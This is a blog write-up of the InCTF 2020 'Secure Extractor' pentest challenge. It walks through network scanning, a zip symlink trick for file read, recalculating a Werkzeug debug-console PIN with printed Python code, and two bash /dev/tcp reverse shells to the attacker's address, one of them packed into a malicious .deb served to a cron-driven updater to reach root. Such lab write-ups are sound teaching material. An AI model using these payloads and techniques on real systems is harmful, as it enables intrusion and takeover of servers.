---
title: "Inctf2020 Secure Extractor"
date: 2020-08-02T21:27:26+02:00
showDate: true
draft: false
tags: ["ctf","pentest","network","python"]
---

Secure Extractor
============
#### [pentest, 22 solves]

> ```TLDR; You had to exploit file upload mechanism in python application to get access to python developer console. To escalate to the root user, you had to make use of bash script, which was executed every minute by cron.```

There are only few CTFs during the year, which have "pentest" or "network" challanges. InCTF is one of them. For each challange you had to download separate OpenVPN config and connect to the enviroment. Each team have it's own enviroment.

First thing that I did, after connecting to the VPN, was scan of the network:

```
➜  nmap -sP 172.30.0.0/28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 20:43 BST
Nmap scan report for 172.30.0.4
Host is up (0.16s latency).
MAC Address: 02:42:D7:96:33:FB (Unknown)
Nmap scan report for 172.30.0.14
Host is up.
Nmap done: 16 IP addresses (2 hosts up) scanned in 3.07 seconds
```

`172.30.0.14` was mine IP, so the target was `172.30.0.4`. Scan of all TCP ports showed that there was ssh and some service at port 5000:

```
➜  nmap -p- -vvv -sT -oN nmap/alltcp 172.30.0.4
(...)
Nmap scan report for 172.30.0.4
Host is up, received arp-response (0.15s latency).
Scanned at 2020-08-01 19:18:48 BST for 1370s
Not shown: 65532 closed ports
Reason: 65532 conn-refused
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack
5000/tcp  open     upnp    syn-ack
56921/tcp filtered unknown no-response
MAC Address: 02:42:D7:96:33:FB (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1370.13 seconds
           Raw packets sent: 1 (28B) | Rcvd: 1 (28B)
```

Quick check of port 5000 revealed that it's a python application, prolly written in flask or django

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 7435
Server: Werkzeug/1.0.1 Python/3.6.9
```

Few ideas come to my mind when there's file upload and archive extraction in the application and the one that actually worked was symlink trick. Using standard `zip` command you can create zip archive that will pack symlink, without following it.

```
➜  ln -s / test
➜  zip --symlinks -r test.zip test 
  adding: test (stored 0%)
```

After uploading crafted zip file, I had full filesystem access (where current user had permissions).

![image](/images/posts/secure-extractor-2.png)

Unfortunately, there wasn't any ssh keys or stored passwords. Also I couldn't view `/root`, so the application was running on low privileged user. After playing a bit with application I managed to crash it, by changing name parameter in Content-Disposition header.

```
Content-Disposition: form-data; name="invalid"; filename="test.zip"
```
So I knew that developer console was enabled. However, it was protected by the PIN, which is generated on the application start. Some time ago I read post about pwning python applications. That post went into details about how is this PIN generated. Basically, if you have some kind of access to the filesystem (eg. through LFI or path traversal), you can recalucate this PIN.

![image](/images/posts/secure-extractor-1.png)

After a little bit of googling I found [writeup](https://ctftime.org/writeup/17955) (great writeup btw.) that described whole process and has code that generates PIN. All I had to do was to gather some information from the filesystem.

```python
from itertools import chain
import hashlib
import getpass
import os

pin = None
rv = None
num = None

probably_public_bits = [ 
  'joyhopkins', # username 
  'flask.app',  # modname
  'Flask',
  '/usr/local/lib/python3.6/dist-packages/flask/app.py' 
] 

private_bits = [ 
  '2486108042235',  # 02:42:d7:96:33:fb  
  'bcba4b3f193446328c240f73bfd693ba'
] 

h = hashlib.md5() 

# Bit is going through every thing in probably_public_bits and private_bits
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, unicode):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt") 

if num is None: 
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9] 

if rv is None: 
    for group_size in 5 , 4 , 3: 
        if len(num) % group_size == 0: 
            rv = '-' .join (num [x: x + group_size] .rjust (group_size, '0') 
            for x in range(0, len(num), group_size)) 
            break 
        else:
            rv = num

print(rv)
```

The PIN generated for my instance was `520-633-406`. With access to python console, I could easily get reverse shell.

```python
import os
os.system("bash -c 'bash >& -i /dev/tcp/172.30.0.14/443 0>&1'")
```

Container had few processes running. One of them was cron. Quick glance on `/etc/crontab` showed that there was some bash script executed every minute.
```bash
joyhopkins@8f4ccaf7cf86:~/project/Uploads/zip$ cat /usr/bin/updater
#!/bin/bash
set -x
server="updates.safextractor.lan"
path="/uploads/packages/"

download () {
    server=$1
    path=$2
    mkdir -p /tmp/packagebuild && cd /tmp/packagebuild
    wget -r -np -R "index.html*" http://$1$2
}

install_pkg () {
    server=$1
    path=$2
    cd /tmp/packagebuild/$server$path
    for i in $(ls); do dpkg -i $i || true; done   
}

nc -z $server 80

if [ $? == 1 ]
then
    echo "Server Not Reachable!"
    exit 1
else
    download $server $path
    install_pkg $server $path
fi
```

Script was downloading all the files, recursively from the web server and tried to install each of them with `dpkg`. However, at that moment it wasn't doing anything, because host `updates.safextractor.lan` was down. It didn't respond to pings or http requests. It's ip was "hard coded" in `/etc/hosts`.

```
joyhopkins@8f4ccaf7cf86:~/project/Uploads/zip$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.30.0.4      8f4ccaf7cf86
172.30.0.6       updates.safextractor.lan
```

I was stuck, because I thought that I had to do some network ninjutsu, but after a while I realised, why I can't just take this ip since it's offline, right?

```
➜  ip a add 172.30.0.6/28 dev tap0
➜  ip a                           
(...)
143: tap0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/ether 16:02:bf:7e:5d:68 brd ff:ff:ff:ff:ff:ff
    inet 172.30.0.14/28 brd 172.30.0.15 scope global tap0
       valid_lft forever preferred_lft forever
    inet 172.30.0.6/28 scope global secondary tap0
       valid_lft forever preferred_lft forever
    inet6 fe80::1402:bfff:fe7e:5d68/64 scope link 
       valid_lft forever preferred_lft forever
```

After a minute I received http request from `172.30.0.4`.

```
➜  python3 -m http.server 80                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.30.0.4 - - [02/Aug/2020 22:39:02] code 404, message File not found
172.30.0.4 - - [02/Aug/2020 22:39:02] "GET /uploads/packages/ HTTP/1.1" 404 -
```

The last step was to craft malicious deb file and serve it to the target machine. To generate it I used [Derbie](https://github.com/mthbernardes/Derbie).

```
➜  cat ../payload.sh 
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/172.30.0.14/443 0>&1'
➜  python3 Derbie.py pwn ../payload.sh
➜  mv debs/pwn_43_all.deb ../www
➜  cd ../www
➜  mkdir -p uploads/packages
➜  mv pwn_43_all.deb uploads/packages
```

A minute later root was pwned.
```
inctf{35526e4b5039555065676d3533556138646d334136446a524b74723578757671}
```
